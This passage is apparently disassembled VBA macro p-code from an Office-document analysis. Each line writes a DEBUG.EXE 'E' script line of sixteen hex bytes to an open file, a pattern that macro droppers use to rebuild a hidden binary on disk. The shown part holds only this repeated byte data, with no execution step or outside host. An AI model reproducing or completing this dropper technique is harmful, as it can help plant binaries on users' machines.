' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 84C0 4F 5C 94 4D 5A 92 42 4F 87 30 3E 73 1E 2D 5E 12"
' 	PrintItemNL 
' Line #2319:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 84D0 23 4E 0F 25 49 32 4A 68 3C 56 6E 40 5B 70 2E 46"
' 	PrintItemNL 
' Line #2320:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 84E0 5E 31 49 61 28 40 58 3F 57 6F 47 5F 75 46 5E 74"
' 	PrintItemNL 
' Line #2321:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 84F0 45 5D 73 4E 66 7C 4F 68 7C 57 70 84 4B 64 78 4F"
' 	PrintItemNL 
' Line #2322:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8500 68 7C 53 6D 7E 71 8B 9C 77 91 A2 5B 75 85 53 6A"
' 	PrintItemNL 
' Line #2323:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8510 7A 66 7D 8C 6E 87 97 6D 86 96 54 6C 7E 70 8A 9B"
' 	PrintItemNL 
' Line #2324:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8520 60 79 8D 64 7D 91 58 72 83 45 5F 70 76 8E A0 85"
' 	PrintItemNL 
' Line #2325:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8530 9E AE 73 8A 99 74 89 98 66 79 86 66 76 82 8D 96"
' 	PrintItemNL 
' Line #2326:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8540 9F 43 47 4C 06 08 09 1C 1E 1E 50 52 52 00 00 00"
' 	PrintItemNL 
' Line #2327:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8550 00 00 F3 F8 F6 ED F2 F0 DB DD DD CD CF CF C1 C3"
' 	PrintItemNL 
' Line #2328:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8560 C4 B9 BD BE 00 00 04 AF B5 BA 97 A3 A9 AB BB C1"
' 	PrintItemNL 
' Line #2329:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8570 9F B0 B9 A8 BB C3 C3 D5 E0 D3 E5 F0 C0 D0 DD B6"
' 	PrintItemNL 
' Line #2330:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8580 C7 D4 C5 D9 E4 9A B2 BE 57 71 82 3D 58 6C 3F 59"
' 	PrintItemNL 
' Line #2331:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8590 71 55 6D 83 57 6E 84 4F 64 79 52 65 7A 41 53 6A"
' 	PrintItemNL 
' Line #2332:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 85A0 2F 42 5D 23 36 51 32 40 5C 1A 27 41 12 1D 33 29"
' 	PrintItemNL 
' Line #2333:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 85B0 35 47 27 37 47 00 0B 18 00 03 12 00 00 14 18 1B"
' 	PrintItemNL 
' Line #2334:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 85C0 3A 48 4E 77 47 55 85 46 5A 8A 54 65 96 5A 69 9A"
' 	PrintItemNL 
' Line #2335:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 85D0 6A 78 AC 75 83 B7 57 67 9C 5E 6C A0 9C A9 D7 BC"
' 	PrintItemNL 
' Line #2336:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 85E0 C9 F7 B3 BE F2 C2 CD FF BB C7 FD 96 A2 D8 7D 89"
' 	PrintItemNL 
' Line #2337:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 85F0 BF 82 8E C4 91 9E D2 9C A9 DD 7E 8B BF 60 6D A1"
' 	PrintItemNL 
' Line #2338:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8600 2E 3B 6F 29 37 68 41 4E 82 54 63 94 5A 68 99 40"
' 	PrintItemNL 
' Line #2339:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8610 4E 82 48 56 8B 50 60 95 57 65 9A 57 67 9C 61 6F"
' 	PrintItemNL 
' Line #2340:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8620 A4 66 75 AD 5E 6B A3 4C 59 91 46 53 8B 35 43 78"
' 	PrintItemNL 
' Line #2341:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8630 23 32 63 14 25 50 0D 23 47 2F 47 65 3D 56 70 45"
' 	PrintItemNL 
' Line #2342:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8640 60 75 2F 47 5F 33 4B 63 2A 42 5A 40 58 70 4A 62"
' 	PrintItemNL 
' Line #2343:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8650 78 4A 62 78 46 5E 74 48 60 76 4A 63 77 56 6F 83"
' 	PrintItemNL 
' Line #2344:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8660 56 6F 83 56 6F 83 50 6A 7B 6E 88 99 75 8F A0 5C"
' 	PrintItemNL 
' Line #2345:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8670 76 87 5B 74 84 6C 83 92 72 8B 9B 61 7A 8A 5B 75"
' 	PrintItemNL 
' Line #2346:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8680 86 6A 84 95 68 81 95 5C 75 89 48 62 73 48 62 73"
' 	PrintItemNL 
' Line #2347:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8690 77 90 A0 81 98 A8 6C 81 90 5D 73 7F 45 58 65 3D"
' 	PrintItemNL 
' Line #2348:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 86A0 4D 59 85 8E 97 39 3F 44 00 00 01 12 17 16 6C 6E"
' 	PrintItemNL 
' Line #2349:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 86B0 6E 00 02 01 00 00 ED F2 F0 EC F1 EF DF E1 E1 D0"
' 	PrintItemNL 
' Line #2350:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 86C0 D2 D2 BF C1 C2 B2 B6 B7 00 00 04 B5 BB C0 CA D6"
' 	PrintItemNL 
' Line #2351:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 86D0 DC B5 C5 CB BD CE D7 CF E2 EA BC CE D9 C0 D2 DD"
' 	PrintItemNL 
' Line #2352:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 86E0 C1 D1 DE BC CD DA C4 D8 E3 9C B4 C0 64 7E 8F 54"
' 	PrintItemNL 
' Line #2353:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 86F0 6F 83 42 5E 76 55 70 85 64 7B 91 57 6C 81 53 66"
' 	PrintItemNL 
' Line #2354:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8700 7B 3F 51 68 31 45 5E 22 35 50 31 3F 5B 1C 2A 41"
' 	PrintItemNL 
' Line #2355:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8710 0F 18 2C 26 30 42 23 32 42 00 08 16 00 07 18 0E"
' 	PrintItemNL 
' Line #2356:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8720 10 28 2A 2F 50 43 4C 77 37 48 79 46 5B 8F 47 5B"
' 	PrintItemNL 
' Line #2357:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8730 8B 4D 61 91 55 66 99 64 75 A8 6A 7B AE 66 77 A8"
' 	PrintItemNL 
' Line #2358:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8740 8F 9D C7 BF CC F8 BB C6 FA BB C6 FF B8 C4 FA A7"
' 	PrintItemNL 
' Line #2359:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8750 B3 E9 8B 99 CE 7A 88 BD 79 87 BC 7A 88 BD 5E 6C"
' 	PrintItemNL 
' Line #2360:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8760 A1 40 4E 83 2F 3D 72 46 54 88 64 72 A7 6C 7D B0"
' 	PrintItemNL 
' Line #2361:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8770 72 80 B4 71 82 B5 6A 79 B1 62 73 AB 55 64 9C 44"
' 	PrintItemNL 
' Line #2362:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8780 55 8D 42 51 89 48 59 92 51 5F 99 53 61 9B 46 54"
' 	PrintItemNL 
' Line #2363:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8790 8E 37 46 7E 25 36 69 15 28 55 10 23 49 31 46 65"
' 	PrintItemNL 
' Line #2364:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 87A0 3F 56 70 49 61 79 30 48 60 36 4E 66 2E 46 5E 45"
' 	PrintItemNL 
' Line #2365:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 87B0 5D 75 4D 65 7B 4B 63 79 42 5A 70 41 59 6F 54 6D"
' 	PrintItemNL 
' Line #2366:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 87C0 81 53 6C 80 56 6F 83 55 6E 82 52 6C 7D 6F 89 9A"
' 	PrintItemNL 
' Line #2367:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 87D0 6B 85 96 56 70 81 6A 83 93 70 89 99 75 8D 9F 4F"
' 	PrintItemNL 
' Line #2368:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 87E0 67 79 68 81 95 63 7C 90 70 89 9D 4F 68 7C 48 62"
' 	PrintItemNL 
' Line #2369:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 87F0 73 59 73 84 75 8E 9E 87 9E AE 7D 92 A1 6B 81 8D"
' 	PrintItemNL 
' Line #2370:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8800 62 75 82 56 67 70 83 8E 96 5D 66 6A 31 36 39 38"
' 	PrintItemNL 
' Line #2371:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8810 3D 3E 82 86 87 03 08 09 00 00 F2 F7 F5 EC F1 EF"
' 	PrintItemNL 
' Line #2372:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8820 DF E1 E1 CF D1 D1 BE C0 C1 B5 B9 BA 02 05 0A D8"
' 	PrintItemNL 
' Line #2373:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8830 DE E3 DB E7 ED B2 C2 C8 CB DC E5 DF F2 FA A6 B8"
' 	PrintItemNL 
' Line #2374:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8840 C3 93 A5 B0 9F AF BC AF C0 CD C0 D4 DF 9C B4 C0"
' 	PrintItemNL 
' Line #2375:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8850 69 83 94 66 81 95 48 64 7C 4E 69 7E 65 7C 92 62"
' 	PrintItemNL 
' Line #2376:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8860 77 8C 54 67 7C 3D 52 68 35 49 62 21 34 4F 2E 3F"
' 	PrintItemNL 
' Line #2377:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8870 59 1E 2C 43 0C 15 29 22 2C 3D 1D 2D 3A 0D 1A 28"
' 	PrintItemNL 
' Line #2378:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8880 14 1B 2A 1F 23 3B 34 3D 5F 41 4E 7A 3C 4F 82 51"
' 	PrintItemNL 
' Line #2379:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8890 67 9B 5B 72 A4 67 7D AD 5F 72 A5 58 69 9C 5E 71"
' 	PrintItemNL 
' Line #2380:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 88A0 A4 5C 6E 9D 83 91 BB B9 C7 F1 BF CC FF B3 BE F7"
' 	PrintItemNL 
' Line #2381:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 88B0 A9 B5 EB A2 AE E4 88 96 CB 6E 7C B1 5E 6C A1 49"
' 	PrintItemNL 
' Line #2382:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 88C0 57 8C 23 31 66 2F 3D 72 47 55 8A 63 71 A6 6F 7F"
' 	PrintItemNL 
' Line #2383:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 88D0 B4 70 80 B5 71 82 B5 75 85 BA 66 77 AF 60 71 AA"
' 	PrintItemNL 
' Line #2384:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 88E0 5F 70 A8 5C 6D A5 4B 5C 95 3B 4C 85 44 54 8F 5A"
' 	PrintItemNL 
' Line #2385:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 88F0 6A A5 48 56 90 3A 49 81 29 3A 6D 19 2C 59 12 25"
' 	PrintItemNL 
' Line #2386:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8900 4B 32 47 67 3F 56 70 48 60 78 33 4B 63 38 50 68"
' 	PrintItemNL 
' Line #2387:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8910 32 4A 62 49 61 79 4E 66 7C 46 5E 74 3E 56 6C 41"
' 	PrintItemNL 
' Line #2388:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8920 59 6F 63 7C 90 4C 65 79 4E 67 7B 53 6C 80 5A 74"
' 	PrintItemNL 
' Line #2389:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8930 85 77 91 A2 5F 79 8A 51 6B 7C 75 8E 9E 76 8F 9F"
' 	PrintItemNL 
' Line #2390:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8940 6F 87 99 4C 66 77 6F 88 9C 62 7B 8F 70 89 9D 47"
' 	PrintItemNL 
' Line #2391:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8950 60 74 52 6C 7D 6D 87 98 79 90 A0 89 A0 AF 84 9A"
' 	PrintItemNL 
' Line #2392:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8960 A6 6A 80 8C 69 7D 88 5E 6F 78 77 84 8C 6C 77 7B"
' 	PrintItemNL 
' Line #2393:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8970 4D 54 57 3F 47 47 78 7D 7E 00 08 08 00 00 F5 FA"
' 	PrintItemNL 
' Line #2394:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8980 F8 EA EF ED DB DD DD CE D0 D0 C1 C3 C4 B8 BC BD"
' 	PrintItemNL 
' Line #2395:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8990 09 0C 11 EA F0 F5 DA E6 EC C0 D0 D6 D6 E7 F0 E0"
' 	PrintItemNL 
' Line #2396:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 89A0 F3 FB B4 C6 D1 9E B0 BB 97 A7 B4 AB BC C9 BF D3"
' 	PrintItemNL 
' Line #2397:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 89B0 DE A3 B9 C5 5E 78 89 5C 77 8B 4A 66 7E 4D 68 7D"
' 	PrintItemNL 
' Line #2398:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 89C0 5E 76 8C 5F 77 8B 56 6B 80 41 56 6C 3A 4E 67 20"
' 	PrintItemNL 
' Line #2399:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 89D0 33 4E 2C 3D 57 22 30 46 0C 16 28 22 2B 39 1C 2B"
' 	PrintItemNL 
' Line #2400:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 89E0 34 1E 2D 36 19 21 2E 1B 20 35 30 39 5B 39 49 74"
' 	PrintItemNL 
' Line #2401:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 89F0 3A 51 83 47 62 95 51 68 9A 64 7A AA 6B 7F AF 64"
' 	PrintItemNL 
' Line #2402:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8A00 75 A6 49 5C 8F 37 49 78 7B 8B B5 BE CC F6 BB C9"
' 	PrintItemNL 
' Line #2403:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8A10 FA B2 BE F4 A4 B0 E6 98 A4 DA 85 93 C8 7B 89 BE"
' 	PrintItemNL 
' Line #2404:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8A20 68 76 AB 3B 49 7E 2B 3B 70 4B 5B 90 5F 6F A4 66"
' 	PrintItemNL 
' Line #2405:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8A30 76 AB 68 79 AC 6D 7E B1 70 83 B6 65 77 AC 62 73"
' 	PrintItemNL 
' Line #2406:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8A40 AB 62 73 AB 64 75 AD 60 71 A9 4A 5E 95 33 46 7F"
' 	PrintItemNL 
' Line #2407:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8A50 2D 3F 7A 35 47 82 4A 5A 95 3A 4B 84 2B 3B 70 1A"
' 	PrintItemNL 
' Line #2408:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8A60 2C 5B 14 26 4F 33 48 68 41 56 71 49 5F 78 38 50"
' 	PrintItemNL 
' Line #2409:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8A70 68 3A 52 6A 32 4A 62 49 61 79 49 61 77 40 58 6E"
' 	PrintItemNL 
' Line #2410:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8A80 3D 55 6B 4A 62 78 5E 77 8B 41 5A 6E 50 69 7D 58"
' 	PrintItemNL 
' Line #2411:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8A90 71 85 61 7B 8C 77 91 A2 58 72 83 62 7C 8D 79 91"
' 	PrintItemNL 
' Line #2412:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8AA0 A3 7E 96 A8 61 7B 8C 5E 78 89 6F 88 9C 67 82 96"
' 	PrintItemNL 
' Line #2413:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8AB0 67 82 96 49 64 78 4B 65 76 6B 85 96 7A 91 A1 88"
' 	PrintItemNL 
' Line #2414:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8AC0 9F AE 84 9A A6 6B 7E 8B 67 79 84 65 76 7F 7D 8A"
' 	PrintItemNL 
' Line #2415:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8AD0 92 3F 4B 51 13 1C 1F 25 2F 2F 68 70 70 00 01 01"
' 	PrintItemNL 
' Line #2416:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8AE0 00 00 F0 F5 F3 E3 E8 E6 D9 DB DB D2 D4 D4 C4 C6"
' 	PrintItemNL 
' Line #2417:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8AF0 C7 B0 B4 B5 00 00 04 D3 D9 DE E5 F1 F7 DC EC F2"
' 	PrintItemNL 
' Line #2418:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8B00 D7 E8 F1 C8 DB E3 B4 C6 D1 A2 B4 BF 79 89 96 7F"
' 	PrintItemNL 
' Line #2419:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8B10 8F 9C C2 D4 DF AC C2 CE 57 6F 81 50 6B 7F 52 6E"
' 	PrintItemNL 
' Line #2420:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8B20 86 5A 74 8C 5B 73 89 55 6D 81 59 6E 83 45 5A 70"
' 	PrintItemNL 
' Line #2421:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8B30 3C 52 6B 1F 33 4C 2B 3D 54 25 34 47 0F 17 28 22"
' 	PrintItemNL 
' Line #2422:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8B40 2C 36 2A 3A 40 31 3F 45 1D 24 2D 1A 21 32 31 3C"
' 	PrintItemNL 
' Line #2423:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8B50 5C 3C 4C 76 3E 55 85 42 5D 8F 58 6F 9F 4A 61 8F"
' 	PrintItemNL 
' Line #2424:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8B60 55 67 96 72 83 B4 5D 6E 9F 3D 4F 7E 81 91 BB AD"
' 	PrintItemNL 
' Line #2425:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8B70 BB E5 B9 C7 F8 B5 C1 F7 A1 AD E3 8E 9B CF 85 93"
' 	PrintItemNL 
' Line #2426:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8B80 C8 8F 9D D1 79 87 BC 34 42 76 5C 6D A0 64 75 A8"
' 	PrintItemNL 
' Line #2427:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8B90 59 6A 9D 5D 6E A1 60 71 A4 5D 6E 9F 67 78 A9 5D"
' 	PrintItemNL 
' Line #2428:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8BA0 6E A1 5B 6B A0 62 72 A7 60 70 A5 54 66 9B 50 62"
' 	PrintItemNL 
' Line #2429:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8BB0 97 4E 62 99 3F 52 8B 2A 3D 76 4C 5C 97 3C 4D 86"
' 	PrintItemNL 
' Line #2430:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8BC0 2B 3B 70 1A 2C 5B 14 26 4F 34 48 6B 41 56 72 4A"
' 	PrintItemNL 
' Line #2431:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8BD0 60 79 3C 54 6C 3B 53 6B 31 49 61 47 5F 77 45 5D"
' 	PrintItemNL 
' Line #2432:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8BE0 73 3B 53 69 3F 57 6D 53 6B 81 4C 65 79 37 50 64"
' 	PrintItemNL 
' Line #2433:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8BF0 59 72 86 62 7B 8F 63 7D 8E 72 8C 9D 56 70 81 7B"
' 	PrintItemNL 
' Line #2434:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8C00 95 A6 78 90 A2 83 9D AE 56 70 81 73 8D 9E 6A 85"
' 	PrintItemNL 
' Line #2435:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8C10 99 6F 8A 9E 5F 7A 8E 50 6B 7F 58 72 83 74 8D 9D"
' 	PrintItemNL 
' Line #2436:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8C20 85 9C AC 88 9D AC 7C 8F 9C 5E 72 7D 51 64 6C 5B"
' 	PrintItemNL 
' Line #2437:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8C30 6C 75 7B 8B 92 75 83 89 59 65 67 3E 48 48 61 6B"
' 	PrintItemNL 
' Line #2438:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8C40 6B 02 0C 0C 00 00 F2 F7 F5 E7 EC EA DE E0 E0 CC"
' 	PrintItemNL 
' Line #2439:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8C50 CE CE C0 C2 C3 B7 BB BC 01 04 09 EB F1 F6 E8 F4"
' 	PrintItemNL 
' Line #2440:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8C60 FA ED FD FF DB EC F5 BE D1 D9 97 A9 B4 94 A6 B1"
' 	PrintItemNL 
' Line #2441:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8C70 BF CF DC C6 D6 E3 E4 F6 FF AA C0 CC 56 6E 80 57"
' 	PrintItemNL 
' Line #2442:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8C80 72 86 4D 69 81 5D 77 8F 58 70 86 5F 77 8D 5D 75"
' 	PrintItemNL 
' Line #2443:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8C90 89 50 67 7D 3A 50 69 22 36 4F 23 36 4B 24 34 45"
' 	PrintItemNL 
' Line #2444:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8CA0 04 0D 1A 22 2E 34 3C 4B 4D 31 41 40 2B 34 38 30"
' 	PrintItemNL 
' Line #2445:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8CB0 38 45 3F 4A 66 45 57 7C 47 5E 8C 4E 68 97 53 6A"
' 	PrintItemNL 
' Line #2446:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8CC0 97 54 67 92 4C 5C 8A 54 64 92 5E 6F A0 4B 5B 8A"
' 	PrintItemNL 
' Line #2447:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8CD0 58 68 93 A1 AE DA BC CA FB B6 C4 F8 A8 B6 EA 8D"
' 	PrintItemNL 
' Line #2448:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8CE0 9C CD 8E 9C D0 7E 8D BE 36 44 78 35 44 75 68 77"
' 	PrintItemNL 
' Line #2449:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8CF0 A8 56 65 96 51 60 91 58 68 97 58 68 97 55 65 94"
' 	PrintItemNL 
' Line #2450:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8D00 52 62 91 4D 5D 8C 50 5F 90 51 5F 93 5D 6B 9F 58"
' 	PrintItemNL 
' Line #2451:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8D10 69 9C 49 5C 8F 4C 5E 93 48 5C 93 33 47 7E 38 4B"
' 	PrintItemNL 
' Line #2452:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8D20 84 46 5A 91 29 3C 6F 1B 2D 5C 14 26 4F 2D 41 64"
' 	PrintItemNL 
' Line #2453:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8D30 4B 60 7C 48 5D 78 40 58 70 49 61 79 3A 52 6A 46"
' 	PrintItemNL 
' Line #2454:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
